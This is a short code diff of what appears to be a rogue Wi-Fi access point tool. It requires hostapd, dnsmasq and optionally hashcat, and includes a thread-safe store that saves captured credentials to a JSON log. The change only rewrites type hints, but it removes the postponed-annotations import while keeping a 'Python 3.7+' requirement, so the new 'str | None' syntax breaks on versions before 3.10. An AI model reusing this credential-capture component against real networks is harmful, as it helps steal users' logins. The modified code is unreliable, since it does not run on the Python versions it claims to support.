@@ -25,7 +25,6 @@ Requires: hostapd, dnsmasq, Python 3.7+. Optional: hashcat.
 Version: 2.0.0
 """
 
-from __future__ import annotations
 
 import http.server
 import json
@@ -77,7 +76,7 @@ _DEFAULT_TEMPLATES = {
 }
 
 
-def _which(binary: str) -> Optional[str]:
+def _which(binary: str) -> str | None:
     return shutil.which(binary)
 
 
@@ -86,11 +85,11 @@ class _CredentialStore:
 
     def __init__(self, log_dir: str):
         self._lock = threading.Lock()
-        self._creds: List[Dict] = []
+        self._creds: list[dict] = []
         self._log_path = os.path.join(log_dir, "captured_credentials.json")
         os.makedirs(log_dir, exist_ok=True)
 
-    def add(self, data: Dict) -> None:
+    def add(self, data: dict) -> None:
         data["timestamp"] = time.strftime("%Y-%m-%dT%H:%M:%S")
         with self._lock:
             self._creds.append(data)
@@ -106,7 +105,7 @@ class _CredentialStore:
             return len(self._creds)
 
     @property
-    def all(self) -> List[Dict]:
+    def all(self) -> list[dict]:
         with self._lock:
             return list(self._creds)
 
